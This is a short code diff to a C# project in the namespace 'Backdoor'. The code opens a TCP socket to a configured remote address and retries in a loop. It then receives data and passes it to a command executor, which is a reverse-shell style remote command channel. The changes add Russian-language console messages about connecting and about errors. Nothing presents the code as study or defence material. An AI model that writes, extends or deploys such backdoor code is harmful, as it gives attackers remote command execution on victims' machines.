@@ -41,12 +41,15 @@ namespace Backdoor
         {
             conn = null;
             conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
+            Console.WriteLine("Поиск соеденения: ");
+            Console.WriteLine("...");
             while (true)
             {
                 try
                 {
                     IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adress), port);
                     conn.Connect(ipEndPoint);
+                    Console.WriteLine($"Подключено к адрес: {adress} порт: {port}");
                     Loop();
                     break;
                 }
@@ -69,7 +72,7 @@ namespace Backdoor
                 {
                     bytesRec = conn.Receive(bytes);
                 }
-                catch { Connect(); break; }
+                catch (Exception e) { Console.WriteLine($"Соеденение преравнно, ошибка {e.Message}"); Connect(); break; }
 
                 CommandExecutor executor = new CommandExecutor();
                 data = Encoding.UTF8.GetString(bytes, 0, bytesRec);
